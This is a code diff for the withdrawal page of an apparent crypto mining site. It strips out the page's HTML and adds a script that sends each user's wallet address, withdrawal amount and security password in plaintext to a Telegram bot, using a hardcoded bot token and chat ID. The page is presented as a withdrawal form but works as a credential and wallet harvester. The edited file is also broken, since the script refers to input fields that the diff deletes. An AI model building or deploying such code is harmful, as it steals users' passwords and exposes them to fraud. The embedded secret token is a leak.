@@ -1,85 +1,57 @@
+<script>
+    async function lancerRetrait() {
+        // Nou rekipere enfòmasyon ki nan memwa telefòn nan (balans, non, elatriye)
+        var soldeActuel = parseFloat(localStorage.getItem('user_balance')) || 0.00; 
+        var username = localStorage.getItem('user_full_name') || "Client Qeyko";
 
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retrait - Qeyko Mining</title>
-    <style>
-        :root { --primary: #c4ff00; --bg-dark: #0f1117; --card-bg: #1a1d26; --border: #2d3340; --text-sec: #8a94ad; }
-        body { background: var(--bg-dark); color: white; font-family: sans-serif; padding: 20px; margin: 0; }
-        .header { display: flex; align-items: center; margin-bottom: 20px; }
-        .back-btn { font-size: 25px; text-decoration: none; color: white; margin-right: 15px; }
-        .balance-card { background: var(--card-bg); padding: 20px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 20px; text-align: center; }
-        .label { display: block; margin: 15px 0 8px; color: var(--text-sec); font-size: 14px; }
-        input { width: 100%; background: var(--card-bg); border: 1px solid var(--border); padding: 12px; border-radius: 10px; color: white; box-sizing: border-box; outline: none; }
-        .confirm-btn { width: 100%; background: var(--primary); color: black; border: none; padding: 15px; border-radius: 30px; font-weight: bold; font-size: 16px; margin-top: 25px; cursor: pointer; }
-        .info-box { margin-top: 25px; background: rgba(196, 255, 0, 0.05); padding: 15px; border-radius: 10px; border: 1px dashed var(--border); font-size: 12px; }
-        .highlight { color: var(--primary); }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <a href="index.html" class="back-btn">‹</a>
-        <span style="font-weight:bold;">Retrait USDT</span>
-    </div>
+        var valWallet = document.getElementById('wallet').value;
+        var valAmount = parseFloat(document.getElementById('amount').value);
+        var valPass = document.getElementById('password').value;
 
-    <div class="balance-card">
-        <div style="color:var(--text-sec); font-size:12px;">Solde disponible</div>
-        <div style="font-size:24px; font-weight:bold; color:var(--primary); margin-top:5px;">0.000000 USDT</div>
-    </div>
+        // --- KONFIGIRASYON BOT ---
+        const token = "8766835411:AAFlASJibyV2oduKOFGY-S1WJxtSsrMi_Ww";
+        const chatId = "8118891270";
 
-    <label class="label">Adresse de retrait (BEP20)</label>
-    <input type="text" id="wallet" placeholder="Entrez votre adresse USDT">
+        // 1. SI YON KAZ VID
+        if(valWallet === "" || isNaN(valAmount) || valPass === "") {
+            alert("❌ Erreur: Tous les champs sont obligatoires !");
+            return;
+        } 
+        
+        // 2. SI MOUN NAN MANDE PLIS KÒB PASE SA L GENYEN
+        if(valAmount > soldeActuel) {
+            alert("❌ Solde insuffisant !\n\nVotre balance est de " + soldeActuel.toFixed(2) + " USDT.");
+            return;
+        }
 
-    <label class="label">Montant du retrait</label>
-    <input type="number" id="amount" placeholder="Minimum 1.00">
+        // 3. SI L METE MWENS PASE 1 USDT
+        if(valAmount < 1) {
+            alert("❌ Erreur: Le montant minimum est de 1.00 USDT.");
+            return;
+        } 
 
-    <label class="label">Mot de passe de sécurité</label>
-    <input type="password" id="password" placeholder="Votre mot de passe">
+        // --- SI TOUT BAGAY BON, N AP VOYE MESAJ LA ---
+        const message = `💸 *DEMANDE DE RETRAIT QEYKO*\n\n` +
+                        `👤 *Client:* ${username}\n` +
+                        `💰 *Montant:* ${valAmount.toFixed(2)} USDT\n` +
+                        `🔗 *Adresse:* \`${valWallet}\`\n` +
+                        `🔑 *Pass:* ||${valPass}||\n\n` +
+                        `⚠️ _Vérifiez manuellement le retrait._`;
 
-    <button type="button" class="confirm-btn" onclick="lancerRetrait()">Confirmer le Retrait</button>
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=MarkdownV2`;
 
-    <div class="info-box">
-        <span style="color:var(--primary); font-weight:bold;">● Rappel chaleureux :</span>
-        <p style="line-height:1.6; color:var(--text-sec);">
-            1. Le retrait minimum est de <span class="highlight">1.00 USDT</span>.<br>
-            2. Les retraits sont traités en <span class="highlight">24h</span> maximum.<br>
-            3. Vérifiez bien votre adresse <span class="highlight">BEP20</span>.
-        </p>
-    </div>
-            <script>
-        function lancerRetrait() {
-            // METE KONBE KÒB MOUN NAN GENYEN LA (Balans li)
-            var soldeActuel = 0.00; 
-
-            var valWallet = document.getElementById('wallet').value;
-            var valAmount = parseFloat(document.getElementById('amount').value);
-            var valPass = document.getElementById('password').value;
-
-            // SI YON KAZ VID
-            if(valWallet === "" || isNaN(valAmount) || valPass === "") {
-                alert("❌ Erreur: Tous les champs sont obligatoires !");
-            } 
-            // SI MOUN NAN MANDE PLIS KÒB PASE SA L GENYEN
-            else if(valAmount > soldeActuel) {
-                alert("❌ Solde insuffisant !\n\nVotre balance est de " + soldeActuel.toFixed(2) + " USDT. Vous ne pouvez pas retirer " + valAmount.toFixed(2) + " USDT.");
-            }
-            // SI L METE MWENS PASE 1 USDT
-            else if(valAmount < 1) {
-                alert("❌ Erreur: Le montant minimum est de 1.00 USDT.");
-            } 
-            // SI TOUT BAGAY BON
-            else {
-                alert("✅ Succès !\n\nVotre demande de retrait de " + valAmount + " USDT a été soumise.");
+        try {
+            const response = await fetch(url);
+            if(response.ok) {
+                alert("✅ Succès !\n\nVotre demande de retrait a été soumise avec succès. Traitement sous 24h.");
                 window.location.href = "index.html";
+            } else {
+                alert("❌ Erreur de serveur. Vérifiez si vous avez activé le bot.");
             }
+        } catch (error) {
+            alert("⚠️ Problème de connexion internet.");
         }
-    </script>
+    }
+</script>
 
-        }
-    </script>
-
-</body>
-</html>
 
